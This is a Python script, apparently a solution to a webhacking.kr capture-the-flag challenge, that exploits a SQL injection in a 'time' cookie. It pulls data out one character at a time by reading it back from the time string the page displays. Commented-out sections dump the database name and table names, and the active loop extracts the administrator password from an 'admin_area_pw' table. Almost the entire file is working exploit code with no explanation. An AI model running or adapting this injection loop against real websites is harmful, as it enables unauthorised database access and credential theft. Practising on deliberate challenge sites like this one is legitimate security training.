import requests
import string
from datetime import datetime

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

URL = "https://webhacking.kr/challenge/web-02/"
SESSION_ID = "1234"
cookies = {'PHPSESSID':SESSION_ID, 'time':''}
params ={}
data = {'pw':'123'}

# get database name
# i = 1
# data_base = ""
# while True:
#     cookies['time'] = f'ord(substr(database(),{i},1))'
#     i += 1
#     response = requests.post(URL, data=data, cookies=cookies)
#     time_string = response.text.split(" ")[1][1:8]
#     # Parse the time string into a time object
#     time_obj = datetime.strptime(time_string, "%H:%M:%S").time()

#     # Extract hours, minutes, and seconds
#     hours = time_obj.hour
#     minutes = time_obj.minute
#     seconds = time_obj.second
#     if minutes or seconds:
#         data_base += chr(minutes*60+seconds)
#         print(data_base)
#     else:
#         break

# find table names
# i = 1
# columns_names = ""
# while True:
#     cookies['time'] = f'ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))'
#     i += 1
#     response = requests.post(URL, data=data, cookies=cookies)
#     time_string = response.text.split(" ")[1][1:8]
#     # Parse the time string into a time object
#     time_obj = datetime.strptime(time_string, "%H:%M:%S").time()

#     # Extract hours, minutes, and seconds
#     hours = time_obj.hour
#     minutes = time_obj.minute
#     seconds = time_obj.second
#     if minutes or seconds:
#         columns_names += chr(minutes*60+seconds)
#         print(columns_names)
#     else:
#         break

# admin_area_pw,log

# pw
# # get password from column 
i = 1
passwords = ""
while True:
    cookies['time'] = f'ord(substr((select group_concat(pw) from admin_area_pw),{i},1))'

    i += 1
    response = requests.post(URL, data=data, cookies=cookies)
    time_string = response.text.split(" ")[1][1:8]
    # Parse the time string into a time object
    time_obj = datetime.strptime(time_string, "%H:%M:%S").time()

    # Extract hours, minutes, and seconds
    hours = time_obj.hour
    minutes = time_obj.minute
    seconds = time_obj.second
    if minutes or seconds:
        passwords += chr(minutes*60+seconds)
        print(passwords)
    else:
        break

    
